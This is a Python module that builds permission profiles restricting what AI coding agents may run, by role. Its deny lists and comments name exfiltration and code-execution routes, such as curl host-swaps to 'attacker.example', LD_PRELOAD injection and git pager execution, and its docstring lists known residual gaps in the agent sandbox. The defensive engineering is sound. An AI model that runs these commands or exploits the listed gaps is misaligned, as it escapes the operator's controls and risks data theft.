"""Role-based agent capabilities: a per-role Claude Code permission profile.

A loop step's ``role`` (``schema.ROLES``) decides how its agent CLI is spawned:

* ``manager``        — read-only: Read/Grep/Glob, git read verbs, read-only shell
  utilities, the loop report command, and writes ONLY under the loop's output dir;
  plus the sub-loop steer MCP tools (loop_save/start/input/list/stop/reply) and
  read-only status probes (``tmux capture-pane -p``, ``tmux list-windows``, ``date``).
* ``input_provider`` — the manager set plus test runners (tester / critic) and
  the EVIDENCE verification set (loopyard-bug-1790562413): ``curl`` to a
  loopback URL only, ``python``/``node`` on the workspace's OWN scripts and
  packages (``-m <pkg>`` / ``<path>``, which is how an app/server is launched on
  a high port; never ``--host`` / ``http.server`` / the prod ports 8771·8795),
  ``npm run dev|preview`` (``--host`` only as literal loopback), a single ``PYTHONPATH=…`` env prefix on
  any of those, and ``git worktree add /tmp/…`` + ``git -C /tmp/… checkout`` for
  fails-before checks. Edit stays denied everywhere but the notes dir; push /
  systemctl / kill / sudo / rm are explicitly denied.
* ``worker`` and every other / absent role — NO profile ⇒ the caller keeps
  today's ``--dangerously-skip-permissions`` argv byte-for-byte (golden).

Mechanism (verified empirically on Claude Code 2.1.283, see the role-caps
audit): ``--permission-mode dontAsk --settings <json>``. ``dontAsk`` silently
DENIES anything not pre-approved, so neither a headless ``-p`` turn nor an
interactive pane can ever hang on a permission prompt. Bypass + deny rules is
NOT used: deny rules hold under bypass but Bash stays wide open.

``LOOPS_ROLE_CAPS=0`` turns the whole feature off (every role ⇒ golden argv).

Honest residual holes (documented, not closed here):

* allowed test runners / the report module execute REPO code by design
  (``conftest.py``, test bodies, npm scripts) — a tester can't *edit* code, but
  code it runs can write anywhere; runner artefacts (``.pytest_cache``,
  ``__pycache__``) land too;
* the notes-dir code-exec route (Write ``<notes>/test_x.py`` then pytest it) is
  closed by extension denies + runner-arg denies (notes path, ``..``, rootdir /
  config / plugin / doctest-glob / addopts). Residual: the arg denies are string
  matches — a shell glob / ``$VAR`` spelling of the notes path is not matched,
  so the extension denies are the load-bearing layer; an unlisted extension an
  allowed runner can execute would reopen it;
* env-prefixed commands other than ONE ``PYTHONPATH=…`` on a tester runner /
  runtime (``GIT_EXTERNAL_DIFF=… git diff``, ``A=1 B=2 pytest``) are denied
  (usability cost, not a hole);
* tester ``curl`` is pinned to a loopback URL by glob only: the URL must be the
  LAST token and every token before it a ``-flag`` (values glued, e.g.
  ``-XPOST -H'A:b'``), so no 2nd (scheme-less) URL; the known host-swap / write
  / redirect / socket flags are denied. Residual: a pre-URL token starting with
  a NON-ASCII char (an IDN host) is not matched, nor is a bundled short flag
  (``-sLo f``);
* 2.1.283 reads a Bash rule ending in ``:*`` as the legacy literal PREFIX form
  and folds ``[ \\t]+`` to one space in rule and command: no generated rule
  ends in ``:*`` (allows are per leading port digit, such denies end ``:**``)
  or holds a TAB (tester-realcli-68f0adc);
* ``pytest -c <file>`` is denied even for ``-c /dev/null`` (use
  ``--rootdir=… --confcutdir=…``: the parent conftest is cut off, and the
  parent ini that ``-c /dev/null`` would skip only adds ``--ignore=api``);
* tester ``python -m <workspace pkg>`` runs repo code that may default to the
  PROD data dir (e.g. a dashboard without a tmp ``--data-dir``) — the same
  "runs repo code by design" hole as pytest; workspace packages/scripts are
  discovered from ``cwd`` when the profile is built (a capped role can't add any);
* an allowed read-only command with an unforeseen write flag — the known ones
  (``--output``, ``--junitxml``, ``--basetemp``, ``--cov``) are denied;
* allow rules in the user's global ``~/.claude`` settings still merge in (deny
  rules here win over them, allows there are not revoked);
* the owner can shift+tab an interactive pane out of dontAsk (human override);
* the report command is allowed under ANY absolute ``…/python[3]`` (B1) — the
  path is pinned to one literal token by metachar denies, but whatever binary
  named ``python``/``python3`` exists on disk may be invoked with
  ``-m mcp_loops.report`` (module resolved from cwd / its site-packages; a
  capped role can't create such a file — notes denies files named ``python``/``python3``);
* ``python3 -c`` stays DENIED for managers: it runs arbitrary code and no rule
  can keep it read-only;
* a manager can read ANY tmux pane it can reach (``capture-pane -p``) — read
  only; chaining (an escaped tmux ``;``), ``#(…)`` formats, ``run-shell``/``send-keys`` denied;
* an ADOPTED manager (the owner's own live session, briefed in place) is never
  respawned, so it keeps whatever permission mode the owner started it with;
* airtight isolation needs per-role uids / read-only mounts (phase 2).
"""
from __future__ import annotations

import json
import os
import shlex
from typing import Iterable, Mapping, Optional

KNOB = "LOOPS_ROLE_CAPS"
CAPPED_ROLES = ("manager", "input_provider")
PERMISSION_ARGS = ("--permission-mode", "dontAsk")

# `NotebookEdit` has no path to allow for any capped role. `MultiEdit` is NOT a
# tool in 2.1.283 (a rule for it prints "matches no known tool") — Edit covers it.
_TOOLS_READ = ("Read", "Grep", "Glob")

# Read-only git verbs. `git branch` is only allowed in its listing forms
# (`git branch -D` mutates); `--output` writes are denied below. NO `git grep`:
# `-O<cmd>` / `--open-files-in-pager=<cmd>` executes an arbitrary command (the
# Grep tool covers the need) — it is also explicitly denied, belt and braces.
_GIT_READ = ("git status", "git log", "git diff", "git show", "git rev-parse",
             "git ls-files", "git blame", "git branch --show-current",
             "git branch --list")
# Read-only shell utilities (redirection `>` is denied by the CLI even under an
# allowed prefix — audit cell c1). No `find` (-delete/-exec), no `sort` (-o).
_SHELL_READ = ("ls", "cat", "head", "tail", "wc", "grep", "rg", "pwd")
# Test runners for input_provider (exact interpreter prefixes only — a leading
# wildcard would admit `python -c "<write>" …/python -m pytest`).
_NODE_TESTS = ("npm test", "npm run test", "npx vitest run")
_PY_NAMES = ("python", "python3")

# ── tester EVIDENCE set (loopyard-bug-1790562413) ─────────────────────────────
# curl only at a loopback URL, flags-first or URL-first. The denies close the
# host-swap (`http://127.0.0.1:1@evil`, `--resolve`, `--connect-to`, proxy,
# redirect, a 2nd scheme URL), write (`-o`/`-O`/`-D`/`-c`/trace/…), upload and
# unix-socket routes. Scoped to `curl` so a note that mentions them still runs.
_LOOPBACK = ("http://127.0.0.1:", "http://localhost:", "http://[::1]:")
_CURL_DENY_FRAGS = (
    "*://*://*", "*@*", "* -o*", "* -O*", "*--remote-name*", "*--output-dir*",
    "*--create-dirs*", "* -T*", "*--upload-file*", "* -K*", "*--config*",
    "*--next*", "* -:*", "* -L*", "*--location*", "* -x*", "*--proxy*",
    "*--preproxy*", "*--connect-to*", "*--resolve*", "*unix-socket*", "* -D*",
    "*--dump-header*", "*--trace*", "*--stderr*", "* -c*", "*--cookie-jar*",
    "*--libcurl*", "*--etag-save*", "*--hsts*", "*--alt-svc*", "* -F*",
    "*--form*",
    # curl URL globbing ({a,b} / [1-9]) can expand to any port; a leading-zero
    # port is still that port. Scoped past `://` so a flags-first JSON body
    # (`-d '{"a": 1}' http://…`) still runs; a body after the URL must move first.
    "*://*{*", "*://*[*-*]*", "*://*:0*",
    # ANY token after the URL is another request (a scheme-less `attacker.example/c`
    # is still a URL to curl), and so is `--url`; DoH / SOCKS / variable expansion
    # are host swaps by another name.
    # (No TAB rule: 2.1.283 folds `[ \t]+` to one space in rule AND command, so
    # `*://* *` already covers a tab, and `curl *<TAB>*` would read `curl * *`.)
    "*://* *", "*--url*", "*--doh*", "*--socks*", "*--variable*", "*--expand*")
# The PROD engine / dashboard listen on loopback too; a tester's POST there would
# mutate live loop state. Any host spelling, any position.
_PROD_PORTS = ("8771", "8795")
# `curl * -o…` needs a token before the flag; `curl -o…` (flag first) is its own rule.
# Before the loopback URL every token must be a `-flag` (values glued: `-XPOST
# -H'Accept:application/json' -d'{"a":1}'`): a token starting with anything else
# is a 2nd positional = a 2nd URL (`curl -d tok attacker.example http://127…`).
# Globs have no char classes, so each non-`-` printable start char is spelled out.
_CURL_POS_START = tuple("\\*" if c == "*" else "\\\\" if c == "\\" else c
                        for c in map(chr, range(33, 127)) if c != "-")
_CURL_DENY = tuple(f"curl {p}" for p in _CURL_DENY_FRAGS) + tuple(
    f"curl {p[2:]}" for p in _CURL_DENY_FRAGS if p.startswith("* -")) + tuple(
    f"curl *:{port}*" for port in _PROD_PORTS) + tuple(
    f"curl * {c}*{u[:-1]}*" for u in _LOOPBACK for c in _CURL_POS_START)
# A port never starts with 0 (`*://*:0*` is denied), so one allow per leading
# digit: `…127.0.0.1:1*` — a rule ending in `:*` would be the legacy PREFIX form.
_PORT_START = tuple("123456789")
# Launching the app under test (a dev server on a high port). NOT `npm run build`:
# a legacy cwd can be the checkout that serves prod dist. Only the argument
# shapes below: a bare Vite `--host` (or `--host=`/a 2nd `--host`) binds every
# interface, so `--host` must be a literal loopback name followed by a space.
_NPM_SERVE = ("npm run dev", "npm run preview")
_NPM_SERVE_ARGS = ("-- --port *", "-- --host 127.0.0.1", "-- --host 127.0.0.1 *",
                   "-- --host localhost", "-- --host localhost *")
_NPM_SERVE_DENY_FRAGS = ("-- --port *--host", "*--host=", "*--host*--host",
                         "*--config", "* -c ")
# Third-party server modules a tester may use to serve the app. NOT http.server:
# it binds 0.0.0.0 by default and `-d /` serves the whole FS (~/.claude creds).
_PY_SERVE_MODS = ("uvicorn",)
# Fails-before checks: a throwaway worktree under /tmp at the parent commit.
# The heads name the /tmp path FIRST so the `*` after it is the only span;
# `..`, a second `-C`, `-c <cfg>` (core.hooksPath ⇒ exec), --git-dir /
# --work-tree / --exec-path and branch creation are denied.
_GIT_TMP = ("git worktree add /tmp/", "git worktree remove /tmp/",
            "git worktree remove --force /tmp/")
_GIT_TMP_C = ("checkout", "status", "log", "diff", "rev-parse", "show")
_GIT_TMP_DENY = ("git worktree add *..*", "git worktree remove *..*",
                 "git worktree * -b *", "git worktree * -B *", "git -C *..*",
                 "git -C /tmp/* -C *", "git * -c *", "git *--config-env*",
                 "git *--git-dir*", "git *--work-tree*", "git *--exec-path*",
                 "git -C /tmp/* checkout *-b *", "git -C /tmp/* checkout *-B *")
# One `PYTHONPATH=` env prefix, no second assignment, no `..`, never the notes dir.
_ENV_PREFIX = "PYTHONPATH="
# Hard denies for the tester (global ~/.claude allows merge in; deny wins).
_TESTER_HARD_DENY = ("git push*", "git -C * push*", "systemctl*", "sudo*",
                     "pkill*", "killall*", "kill *", "rm *", "service *",
                     "npm run build*", "npm install*", "npm i *", "npm ci*")
_SERVE_DENY_FRAGS = ("0.0.0.0", "--bind", "-b ", "--host ::", "http.server",
                     "--directory", "-d ")
# python / node servers keep their (loopback) default host: no `--host` at all.
# node never reaches into node_modules (`node_modules/.bin/vite build` is the
# `npm run build` deny by another name) nor runs a build script.
_PY_NODE_SERVE_DENY = ("--host",)
_NODE_DENY = ("node *node_modules*", "node *build*")
_SKIP_ENTRIES = ("node_modules", "__pycache__")
# Has its own allow (the report prefixes). It is never a runtime head, so the
# runtime arg denies (notes path, `-d `, `--host`, …) can't block a report note
# such as `artifact=<notes>/x.txt`.
_NOT_RUNTIME = ("mcp_loops.report",)


def _submodules(pkg_dir: str, pkg: str) -> list:
    """``pkg.mod`` for each direct ``.py`` module / sub-package of ``pkg_dir``."""
    try:
        names = sorted(os.listdir(pkg_dir))
    except OSError:
        return []
    out = []
    for n in names:
        mod = n[:-3] if n.endswith(".py") else n
        if not mod.isidentifier() or mod == "__init__":
            continue
        if n.endswith(".py") or os.path.isfile(os.path.join(pkg_dir, n, "__init__.py")):
            if f"{pkg}.{mod}" not in _NOT_RUNTIME:
                out.append(f"{pkg}.{mod}")
    return out


def _workspace_entries(cwd: str):
    """(python modules, dirs, python scripts, node scripts) at the top of
    ``cwd`` plus one level down for packages (``worker/bot_squad_worker``) —
    the repo's OWN code, which a capped role cannot write. Modules are each
    package and its direct submodules, spelled out (no ``pkg.*`` glob). Missing
    cwd ⇒ empty."""
    pkgs, dirs, py, js = [], [], [], []
    try:
        names = sorted(os.listdir(cwd))
    except OSError:
        return pkgs, dirs, py, js
    for n in names:
        if n.startswith(".") or n in _SKIP_ENTRIES or any(c in n for c in " *'\"$`"):
            continue
        full = os.path.join(cwd, n)
        if os.path.isdir(full) and not os.path.islink(full):
            dirs.append(n)
            if n.isidentifier() and os.path.isfile(os.path.join(full, "__init__.py")):
                pkgs += [n] + _submodules(full, n)
            try:
                subs = sorted(os.listdir(full))
            except OSError:
                subs = []
            for s in subs:
                if (s.isidentifier() and s not in pkgs
                        and os.path.isfile(os.path.join(full, s, "__init__.py"))):
                    pkgs += [s] + _submodules(os.path.join(full, s), s)
        elif n.endswith(".py"):
            py.append(n)
        elif n.endswith((".js", ".mjs", ".cjs")):
            js.append(n)
    return pkgs, dirs, py, js


def _glob_head(head: str) -> str:
    """``head *`` — or ``head*`` for a glued head (``-m pkg.`` / ``<dir>/``) whose
    argument continues the same token."""
    return f"{head}*" if head.endswith((".", "/")) else f"{head} *"


def tester_runtime_heads(python: str, cwd: str) -> list:
    """Command heads (no trailing `` *``) the tester may run to launch / probe
    the product: python on the workspace's packages & scripts, node scripts,
    dev-server npm scripts. Each gets the same runner arg denies as pytest."""
    pkgs, dirs, py, js = _workspace_entries(cwd)
    cwd = os.path.normpath(cwd)
    heads = []
    for name in dict.fromkeys((str(python),) + _PY_NAMES):
        q = shlex.quote(name)
        heads += [f"{q} -m {m}" for m in pkgs + list(_PY_SERVE_MODS)]
        heads += [f"{q} {d}/" for d in dirs] + [f"{q} {f}" for f in py]
        heads.append(f"{q} {shlex.quote(cwd)}/")
    heads += [f"node {d}/" for d in dirs] + [f"node {f}" for f in js]
    heads.append(f"node {shlex.quote(cwd)}/")
    heads += list(_NPM_SERVE)
    return heads


def _runtime_allow(h: str) -> list:
    """Allow rules for one runtime head; npm dev servers only in _NPM_SERVE_ARGS."""
    if h in _NPM_SERVE:
        return [h] + [f"{h} {a}" for a in _NPM_SERVE_ARGS]
    return [_glob_head(h)] + ([] if h.endswith((".", "/")) else [h])


# Known write flags of otherwise-allowed commands (leading-wildcard denies work
# in 2.1.283 — audit cell c5).
_DENY_BASH = ("* --output*", "*--junitxml*", "*--junit-xml*", "*--basetemp*",
              "*--cov*", "git grep*", "*--open-files-in-pager*", "*--ext-diff*",
              "rg *--pre*")

# The notes dir is the one writable tree; nothing written there may be code an
# allowed command could then execute (a tester's pytest on `<notes>/test_x.py`,
# a conftest, a `.pth`/`.pyc`/zip on a pythonpath, an ini that sets addopts,
# a node test / package.json). Deny beats the notes `Edit(…/**)` allow.
_NOTES_EXEC_DENY = ("*.py", "*.pyc", "*.pyo", "*.pth", "*.zip", "*.egg", "*.whl",
                    "conftest*", "pytest.ini", "pyproject.toml", "setup.cfg",
                    "tox.ini", "*.sh", "*.js", "*.mjs", "*.cjs", "*.ts", "*.mts",
                    "*.cts", "*.jsx", "*.tsx", "package.json", ".npmrc")
# Runner arguments that point a test runner at another rootdir / config / plugin
# / doctest-in-text, or out of cwd by a relative path. Scoped to the runner
# prefixes (not global) so a report note that merely MENTIONS them still runs.
# `--rootdir=` / `--confcutdir=` load no code (the loop-standard isolation:
# `--rootdir=$W --confcutdir=$W`; the notes / `..` frags still guard their value).
# `-c` stays denied even as `-c /dev/null`: a glob can't pin the value, and
# `cat <notes>/x.txt | pytest -c /dev/stdin` would load a tester-written ini.
_RUNNER_DENY_FRAGS = ("..", "-c ", "--config-file", "-p ", "--doctest-glob",
                      "addopts")

# The report command under ANY interpreter (B1): agents substitute a different
# python than the engine's (on this box the banner's venv python does not exist).
# Allowed as `/<abs path>/python[3] [-I] -m mcp_loops.report …` and the bare
# PATH form `python[3] [-I] -m mcp_loops.report …`. The glob in `/*/python` can
# span a space, so on 2.1.283 WITHOUT the denies below
# `/usr/bin/touch <f> /x/python -m mcp_loops.report` and
# `python3 -c "<write>" /python3 -m mcp_loops.report` RUN (B1 control cell).
# Deny beats allow: any whitespace / shell metachar / glob char BEFORE the
# `/python[3] … -m mcp_loops.report` head ⇒ denied, so the interpreter token is
# a single literal absolute path. `\*` is a literal `*` in 2.1.283 rules.
_REPORT_HEADS = tuple(f"/{py}{iso} -m mcp_loops.report"
                      for py in ("python", "python3") for iso in ("", " -I"))
_REPORT_ANY = tuple("/*" + h for h in _REPORT_HEADS) + tuple(
    h[1:] for h in _REPORT_HEADS)
# No TAB entry: the CLI folds tabs to spaces, so " " covers it.
_PATH_META = (" ", "\\*", "?", "[", "{", "$", "`", "\\\\", "'", '"', "<", ">",
              "(", ";", "&", "|", "~")
# The one tree a capped role can write must not hold a fake interpreter.
_NOTES_INTERP_DENY = ("python", "python3")

# Read-only loop-control MCP tools a manager / tester may consult (the hub doc,
# the loop's own status). Everything else MCP is denied by dontAsk.
_MCP_READ = tuple(f"mcp__mcp-loops__{t}" for t in (
    "loop_doc_get", "loop_docs_list", "loop_get", "loop_status", "get_loop_status",
    "loop_turn_detail", "loop_agent_reports", "loop_thread_get", "loop_issue_get",
    "loop_issues_list", "loop_result_view", "get_loop_result"))
# Director-style managers drive sub-loops (B2): manager ONLY, never input_provider.
_MCP_MANAGER_STEER = tuple(f"mcp__mcp-loops__{t}" for t in (
    "loop_save", "loop_start", "loop_input", "loop_list", "loop_stop", "loop_reply"))
# Manager read-only status probes (B3). `tmux … \;` chains another tmux command
# (send-keys / run-shell) and `#(…)` in a -F format runs a shell command ⇒
# denied. `date -s/--set` is denied. `sleep` is auto-allowed by 2.1.283's
# built-in read-only list (B3 cell) ⇒ explicitly denied (a turn must not park). NO `python3 -c`: it executes
# arbitrary code and no prefix/deny rule can keep it read-only ⇒ left denied.
_MANAGER_STATUS = ("tmux capture-pane -p", "tmux list-windows", "date")
_MANAGER_STATUS_DENY = ("tmux *;*", "tmux *#(*", "tmux *run-shell*",
                        "tmux *send-keys*", "date *-s*", "date *--set*",
                        "sleep", "sleep *")


def caps_enabled(env: Optional[Mapping[str, str]] = None) -> bool:
    """Default ON; ``LOOPS_ROLE_CAPS=0`` (or false/off/no) restores today's argv."""
    v = (os.environ if env is None else env).get(KNOB, "")
    return v.strip().lower() not in ("0", "false", "off", "no")


def is_capped(role: Optional[str], env: Optional[Mapping[str, str]] = None) -> bool:
    return role in CAPPED_ROLES and caps_enabled(env)


def _within(child: str, parent: str) -> bool:
    child, parent = os.path.normpath(child), os.path.normpath(parent)
    return child == parent or child.startswith(parent.rstrip(os.sep) + os.sep)


def _abs_rule(tool: str, path: str) -> str:
    # `//abs/path/**` = absolute path in Claude Code permission rules.
    return f"{tool}(/{os.path.normpath(path)}/**)"


def report_prefixes(repo: str, python: str, python_flags: Iterable[str] = ()) -> list:
    """Both forms the agent may run: ``cd <repo> && <py> [-I] -m mcp_loops.report``
    (the banner's exact prefix) and the bare ``<py> [-I] -m mcp_loops.report``.
    Quoting matches ``HeadlessSubstrate._report_prefix``."""
    iso = " -I" if "-I" in tuple(python_flags or ()) else ""
    bare = f"{shlex.quote(str(python))}{iso} -m mcp_loops.report"
    return [f"cd {shlex.quote(str(repo))} && {bare}", bare]


def build_profile(role: Optional[str], *, repo: str, python: str,
                  python_flags: Iterable[str] = (), cwd: str, notes_dir: str,
                  env: Optional[Mapping[str, str]] = None) -> Optional[dict]:
    """The ``--settings`` JSON for ``role``, or ``None`` when the role is not
    capped (worker / unknown / absent) or the knob is off ⇒ caller keeps golden.

    ``notes_dir`` is the ONLY tree a capped role may Write/Edit. The agent's
    ``cwd`` (the loop workspace) and the engine ``repo`` are explicitly denied
    for Edit/Write too — deny beats allow across every settings source, so a
    project-level ``.claude/settings*.json`` in the workspace can't re-open it.
    A tree that CONTAINS the notes dir is not denied (deny would shadow notes)."""
    if not is_capped(role, env):
        return None
    allow = list(_TOOLS_READ)
    allow += [f"Bash({p} *)" for p in _GIT_READ + _SHELL_READ]
    allow += [f"Bash({p} *)" for p in report_prefixes(repo, python, python_flags)]
    allow += [f"Bash({p} *)" for p in _REPORT_ANY]
    if role == "manager":
        allow += [f"Bash({p} *)" for p in _MANAGER_STATUS] + ["Bash(date)"]
    runners = []
    if role == "input_provider":
        for py in dict.fromkeys((str(python),) + _PY_NAMES):
            q = shlex.quote(py)
            runners += [f"{q} -m pytest", f"{q} -I -m pytest"]
        runners += ["pytest", *_NODE_TESTS]
        allow += [f"Bash({r} *)" for r in runners]
        # the EVIDENCE set (bug-1790562413) — see the module docstring
        runtime = tester_runtime_heads(python, cwd)
        allow += [f"Bash({r})" for h in runtime for r in _runtime_allow(h)]
        pys = tuple(shlex.quote(p) + " " for p in (str(python),) + _PY_NAMES)
        env_heads = [r for r in runners if r not in _NODE_TESTS] + [
            h for h in runtime if h.startswith(pys)]
        allow += [f"Bash({_ENV_PREFIX}* {_glob_head(h)})" for h in env_heads]
        allow += [f"Bash(curl {u}{d}*)" for u in _LOOPBACK for d in _PORT_START]
        allow += [f"Bash(curl -* {u}{d}*)" for u in _LOOPBACK for d in _PORT_START]
        allow += [f"Bash({g}*)" for g in _GIT_TMP] + ["Bash(git worktree list*)"]
        allow += [f"Bash(git -C /tmp/* {v} *)" for v in _GIT_TMP_C]
    # Only `Edit(path)` rules are matched by file permission checks in 2.1.283
    # (a `Write(path)` rule warns "is not matched…"); Edit covers Write too.
    allow.append(_abs_rule("Edit", notes_dir))
    allow += list(_MCP_READ)
    if role == "manager":
        allow += list(_MCP_MANAGER_STEER)
    deny = ["NotebookEdit"]
    for tree in dict.fromkeys((os.path.normpath(cwd), os.path.normpath(str(repo)))):
        if not _within(notes_dir, tree):
            deny.append(_abs_rule("Edit", tree))
    deny += [f"Bash({p})" for p in _DENY_BASH]
    notes = os.path.normpath(notes_dir)
    deny += [f"Edit(/{notes}/**/{pat})" for pat in _NOTES_EXEC_DENY + _NOTES_INTERP_DENY]
    deny += [f"Bash(/*{c}*{h}*)" for h in _REPORT_HEADS for c in _PATH_META]
    if role == "manager":
        deny += [f"Bash({p})" for p in _MANAGER_STATUS_DENY]
    for r in runners:
        deny += [f"Bash({r} *{frag}*)" for frag in (notes,) + _RUNNER_DENY_FRAGS]
    if role == "input_provider":
        # runtime: never the notes dir / `..`, and a launched server stays on loopback
        deny += [f"Bash({_glob_head(h)}{frag}*)" for h in runtime
                 for frag in (notes, "..") + _SERVE_DENY_FRAGS]
        deny += [f"Bash({_glob_head(h)}{frag}*)" for h in runtime
                 if h not in _NPM_SERVE for frag in _PY_NODE_SERVE_DENY]
        deny += [f"Bash({h} {frag}*)" for h in _NPM_SERVE for frag in _NPM_SERVE_DENY_FRAGS]
        deny += [f"Bash({p})" for p in _NODE_DENY]
        # env prefix: one PYTHONPATH (no `..`, not notes), no 2nd assignment
        # (`PYTHONPATH=a LD_PRELOAD=b pytest`), and the runner arg denies still hold
        deny += [f"Bash({_ENV_PREFIX}*..*)", f"Bash({_ENV_PREFIX}*{notes}*)"]
        deny += [f"Bash({_ENV_PREFIX}* *=* {h}*)" for h in env_heads]
        deny += [f"Bash({_ENV_PREFIX}* {r} *{frag}*)" for r in runners
                 if r not in _NODE_TESTS for frag in _RUNNER_DENY_FRAGS if frag != ".."]
        deny += [f"Bash({p})" for p in _CURL_DENY + _GIT_TMP_DENY + _TESTER_HARD_DENY]
        # a workspace / repo that itself lives under /tmp is still not checkout-able
        for tree in dict.fromkeys((os.path.normpath(cwd), os.path.normpath(str(repo)))):
            deny += [f"Bash(git -C {shlex.quote(tree)}*)",
                     f"Bash(git worktree add {shlex.quote(tree)}*)"]
    deny = [_not_legacy(r) for r in deny]
    assert not any(_is_legacy(r) for r in allow), "allow rule in legacy `:*` form"
    # The report prefix `cd <repo> && …` is DENIED under dontAsk when <repo> is
    # outside the session's working dirs, even with a matching Bash rule (T2
    # smoke); listing the repo as an additional working dir admits it. Edits
    # there stay denied (the Edit deny above + dontAsk).
    return {"permissions": {"allow": allow, "deny": deny,
                            "additionalDirectories": [os.path.normpath(str(repo))]}}


def _is_legacy(rule: str) -> bool:
    """2.1.283 reads a rule body matching ``^(.+):\\*$`` as the legacy PREFIX
    syntax: everything before ``:*`` is a LITERAL prefix (its ``*`` included), so
    ``Bash(curl -* http://127.0.0.1:*)`` never matches a real curl."""
    return rule.endswith(":*)")


def _not_legacy(rule: str) -> str:
    """A deny whose glob ends in ``:*`` (``…--host ::*``, ``curl * -:*``) gets a
    ``:**`` tail — the same glob in 2.1.283 (``**`` is only special as ``/**/``),
    never the legacy prefix form. A broader deny is the safe direction."""
    return rule[:-1] + "*)" if _is_legacy(rule) else rule


def dumps(profile: dict) -> str:
    return json.dumps(profile, indent=1, sort_keys=True) + "\n"


def write_settings(profile: dict, path: str) -> str:
    """Atomically write the profile JSON (never under ~/.claude — callers pass a
    per-loop dir). Returns ``path``."""
    os.makedirs(os.path.dirname(path), exist_ok=True)
    tmp = f"{path}.tmp{os.getpid()}"
    with open(tmp, "w", encoding="utf-8") as fh:
        fh.write(dumps(profile))
    os.replace(tmp, path)
    return path


def settings_path(loop_dir: str, role: str) -> str:
    """``<loop status dir>/role_caps/<role>.settings.json`` — deterministic, per
    loop, outside the agent's cwd and outside its writable notes dir."""
    return os.path.join(loop_dir, "role_caps", f"{role}.settings.json")


def cli_args(settings_file: str) -> list:
    """The argv tail that REPLACES ``--dangerously-skip-permissions``."""
    return [*PERMISSION_ARGS, "--settings", str(settings_file)]
